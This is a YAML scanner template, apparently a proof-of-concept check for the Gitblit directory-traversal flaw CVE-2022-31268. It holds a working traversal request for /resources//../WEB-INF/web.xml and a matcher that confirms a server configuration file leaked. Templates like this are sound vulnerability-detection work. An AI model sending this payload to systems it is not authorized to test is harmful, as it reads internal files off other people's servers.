name: yaml-poc-gitblit-gitblit-directory_traversal-CVE-2022-31268
binding: 09a43fd0-15de-4542-ab9a-ec125e4e77f9
detail:
    author: system_user
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-31268/
        - https://github.com/metaStor/Vuls/blob/main/gitblit/gitblit%20V1.9.3%20path%20traversal/gitblit%20V1.9.3%20path%20traversal.md
    vulnerability:
        id: f683c4c6-5b26-4ed9-8466-a53813c2f661
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /resources//../WEB-INF/web.xml
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("xml") && "\\<display-name\\>.*\\</display-name\\>".bmatches(response.body) && response.body_string.contains("<listener-class>com.gitblit.servlet")
expression: r0()
